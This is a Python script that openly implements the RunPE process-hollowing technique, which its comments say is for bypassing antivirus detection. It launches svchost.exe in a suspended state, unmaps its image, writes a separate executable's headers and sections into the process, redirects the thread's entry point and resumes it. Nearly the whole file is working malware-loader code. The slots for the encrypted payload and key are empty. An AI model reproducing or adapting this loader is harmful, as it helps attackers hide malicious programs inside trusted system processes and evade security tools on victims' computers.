#!/usr/bin/env python

# This script uses the runpe technique to bypass AV detection
# The payload it contains, is encrypted each time with a random key

# INSTALL pefile and ctypes packages


import sys
import pefile
import ctypes


BYTE = ctypes.c_ubyte
WORD = ctypes.c_ushort
DWORD = ctypes.c_ulong
LPSTR = ctypes.c_char_p
HANDLE = ctypes.c_void_p

CREATE_SUSPENDED = 0x0004
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess', HANDLE),
        ('hThread', HANDLE),
        ('dwProcessId', DWORD),
        ('dwThreadId', DWORD),
    ]


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ('cb', DWORD),
        ('lpReserved', LPSTR),
        ('lpDesktop', LPSTR),
        ('lpTitle', LPSTR),
        ('dwX', DWORD),
        ('dwY', DWORD),
        ('dwXSize', DWORD),
        ('dwYSize', DWORD),
        ('dwXCountChars', DWORD),
        ('dwYCountChars', DWORD),
        ('dwFillAttribute', DWORD),
        ('dwFlags', DWORD),
        ('wShowWindow', WORD),
        ('cbReserved2', WORD),
        ('lpReserved2', DWORD),
        ('hStdInput', HANDLE),
        ('hStdOutput', HANDLE),
        ('hStdError', HANDLE),
    ]


class FLOATING_SAVE_AREA(ctypes.Structure):
    _fields_ = [
        ("ControlWord", DWORD),
        ("StatusWord", DWORD),
        ("TagWord", DWORD),
        ("ErrorOffset", DWORD),
        ("ErrorSelector", DWORD),
        ("DataOffset", DWORD),
        ("DataSelector", DWORD),
        ("RegisterArea", BYTE * 80),
        ("Cr0NpxState", DWORD),
    ]


class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", DWORD),
        ("Dr0", DWORD),
        ("Dr1", DWORD),
        ("Dr2", DWORD),
        ("Dr3", DWORD),
        ("Dr6", DWORD),
        ("Dr7", DWORD),
        ("FloatSave", FLOATING_SAVE_AREA),
        ("SegGs", DWORD),
        ("SegFs", DWORD),
        ("SegEs", DWORD),
        ("SegDs", DWORD),
        ("Edi", DWORD),
        ("Esi", DWORD),
        ("Ebx", DWORD),
        ("Edx", DWORD),
        ("Ecx", DWORD),
        ("Eax", DWORD),
        ("Ebp", DWORD),
        ("Eip", DWORD),
        ("SegCs", DWORD),
        ("EFlags", DWORD),
        ("Esp", DWORD),
        ("SegSs", DWORD),
        ("ExtendedRegisters", BYTE * 80),
    ]

# Encrypted Buffer

# Random Key

# File Path


si = STARTUPINFO()
si.cb = ctypes.sizeof(STARTUPINFO)
pi = PROCESS_INFORMATION()
cx = CONTEXT()
cx.ContextFlags = 0x10007

decryptedbuff = None
EXECUTABLE_FILEPATH = "C:\\Users\\Administrator\\Documents\\GitHub\\python-pe-inmemory-exec\\3DECRYPTED\\executable.exe"
with open(
        EXECUTABLE_FILEPATH,
        'rb'
) as f:
    decryptedbuff = f.read()

# Get payload buffer as PE file
pe = pefile.PE(data=decryptedbuff)
fd_size = len(decryptedbuff)

calloc = ctypes.cdll.msvcrt.calloc
p = calloc((fd_size+1), ctypes.sizeof(ctypes.c_char))


ctypes.memmove.argstype = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
ctypes.memmove.restype = ctypes.c_void_p
ctypes.memmove(p, decryptedbuff, fd_size)

pefilepath = pefile.PE(EXECUTABLE_FILEPATH)

# Create new process in suspedend mode using a legitim executable (Ex. svchost.exe)
if ctypes.windll.kernel32.CreateProcessA(None, '%SystemRoot%\System32\svchost.exe', None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
    print("[+] CreateProcessA Success")
else:
    sys.exit(1)

# Unmap the view of sections of the new process created
if ctypes.windll.ntdll.NtUnmapViewOfSection(pi.hProcess, LPSTR(pefilepath.OPTIONAL_HEADER.ImageBase)):
    print("[+] NtUnmapViewOfSection Success")
else:
    sys.exit(1)

# Allocate memory to base address of malicious executable in suspended process
if ctypes.windll.kernel32.VirtualAllocEx(pi.hProcess, pe.OPTIONAL_HEADER.ImageBase, pe.OPTIONAL_HEADER.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE):
    print("[+] VirtualAllocEx Success")
else:
    sys.exit(1)
    # Write in memory malicious file's header
if ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, LPSTR(pe.OPTIONAL_HEADER.ImageBase), p, ctypes.c_int(pe.OPTIONAL_HEADER.SizeOfHeaders), None):
    print("[+] WriteProcessMemory Success")
else:
    sys.exit(1)

# Write sections one by one to memory
for section in pe.sections:
    if ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, LPSTR(pe.OPTIONAL_HEADER.ImageBase+section.VirtualAddress), (p+section.PointerToRawData), ctypes.c_int(section.SizeOfRawData), None):
        print('ok')
    else:
        sys.exit(1)

# Get CPU context of this process
if ctypes.windll.kernel32.GetThreadContext(pi.hThread, ctypes.byref(cx)):
    print('ok')
else:
    sys.exit(1)

# Push the address of entry point in eax
cx.Eax = pe.OPTIONAL_HEADER.ImageBase + pe.OPTIONAL_HEADER.AddressOfEntryPoint

# Write ImageBase to Ebx+8
if ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, LPSTR(cx.Ebx+8), (p+0x11C), 4, None):
    print('ok')
else:
    sys.exit(1)

# Replace CPU context
if ctypes.windll.kernel32.SetThreadContext(pi.hThread, ctypes.byref(cx)):
    print('ok')
else:
    sys.exit(1)

# Resume the process so windows continues the execution
if ctypes.windll.kernel32.ResumeThread(pi.hThread):
    print('ok')
else:
    sys.exit(1)
